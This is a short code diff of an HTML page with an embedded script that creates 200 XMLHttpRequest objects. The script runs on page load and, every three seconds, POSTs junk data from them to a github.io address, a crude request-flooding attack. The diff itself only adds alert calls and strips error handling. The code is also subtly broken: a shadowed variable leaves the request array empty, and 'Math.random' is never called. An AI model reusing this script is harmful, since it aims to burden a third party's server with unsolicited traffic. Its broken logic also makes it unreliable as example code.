@@ -3,26 +3,24 @@
 </head>
 <body>
   <script>
+    alert("hi")
     var connections = [];
     function spam() {
-    try {
       var connections = []
       for (i=0;i<200;i++) {
         var xhttp = new XMLHttpRequest();
         connections.push(xhttp);
       }
-    } catch(error) {alert(error)}
     }
     function respam() {
-      try {
       for (i=0;i<connections.length;i++) {
         connections[i].open("POST", "https://supersirbird.github.io/cmd_exe/", true);
         connections[i].setRequestHeader("Content-type", "application/x-www-form-urlencoded");
         connections[i].send(Math.round(Math.random))
       }
-      } catch(error) {alert(error)}
     }
     spam();
     setInterval(function(){ respam(); }, 3000);
+    alert("hi2")
   </script>
 </body>
